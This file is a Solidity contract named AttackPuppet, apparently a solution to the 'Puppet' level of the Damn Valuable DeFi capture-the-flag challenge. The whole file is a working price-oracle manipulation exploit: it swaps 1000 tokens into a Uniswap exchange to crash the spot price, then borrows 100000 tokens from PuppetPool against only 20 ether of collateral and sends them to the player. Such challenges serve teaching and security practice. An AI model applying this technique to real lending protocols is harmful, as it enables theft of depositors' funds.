// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {IUniswapExchange} from "./IUniswapExchange.sol";
import {PuppetPool} from "./PuppetPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract AttackPuppet {
    uint256 amount1 = 1000 ether;
    uint256 amount2 = 100000 ether;

    IUniswapExchange public exchange;
    PuppetPool public pool;
    DamnValuableToken public token;
    address public player;

    // uint256 public count;

    constructor(IUniswapExchange _exchange, PuppetPool _pool, DamnValuableToken _token, address _player) payable {
        exchange = _exchange;
        pool = _pool;
        token = _token;
        player = _player;
    }

    function swap() public {
        token.approve(address(exchange), amount1);
        exchange.tokenToEthSwapInput(amount1, 1, block.timestamp + 5000);
        pool.borrow{value: 20 ether, gas: 1000000}(amount2, player);
    }

    receive() external payable {}
}
